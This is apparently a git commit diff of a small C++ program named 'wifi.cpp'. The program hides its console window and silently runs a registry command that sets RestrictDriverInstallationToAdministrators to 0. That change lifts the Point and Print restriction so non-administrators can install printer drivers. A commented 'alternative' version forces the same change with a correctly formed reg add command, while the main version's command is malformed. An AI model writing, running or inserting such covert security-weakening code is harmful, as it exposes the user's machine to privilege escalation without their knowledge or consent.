9eeb8277f98278c67d82bf5c24480af96027c8d5
Frederico02 <81171707+Frederico02@users.noreply.github.com>
2023-01-25 03:58:28 -0300

    Update wifi.cpp

--- wifi.cpp
+++ wifi.cpp
@@ -11,7 +11,17 @@ int main(){
 	
 	ShowWindow(GetConsoleWindow(), SW_HIDE); // esconder prompt de comando
 	
-	system("[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\printers\\PointAndPrint]");
-	system("\"RestrictDriverInstallationToAdministrators\"=dword:00000000");
+	system("reg add[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\printers\\PointAndPrint]\"RestrictDriverInstallationToAdministrators\"=dword:00000000");
 	return 0;
 }
+
+/* Alternativo 
+
+#include <iostream>
+#include <cstdlib>
+
+int main() {
+    std::system("reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\printers\\PointAndPrint /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 0 /f");
+    return 0;
+}
+*/
